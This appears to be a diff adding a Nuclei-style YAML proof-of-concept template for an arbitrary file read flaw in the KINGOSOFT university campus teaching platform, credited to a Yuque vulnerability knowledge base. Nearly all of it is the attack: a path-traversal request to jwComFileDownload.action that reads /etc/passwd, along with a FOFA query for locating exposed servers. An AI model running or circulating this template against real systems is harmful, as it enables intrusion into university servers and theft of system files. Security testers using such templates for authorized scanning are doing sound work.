@@ -1,0 +1,31 @@
+id: poc-hkewb3go8yfbbxf3
+info:
+  name: KINGOSOFT高校智慧校园教学综合服务平台 jwComFileDownload 存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hkewb3go8yfbbxf3'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hkewb3go8yfbbxf3
+    fofa: app="KINGOSOFT高校智慧校园教学综合服务平台"
+http:
+- raw:
+  - 'GET /jw/lessonchangeapply/jwComFileDownload.action?fileSavePath=../../../../../../../etc/passwd&name= HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
+
+    Connection: keep-alive
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
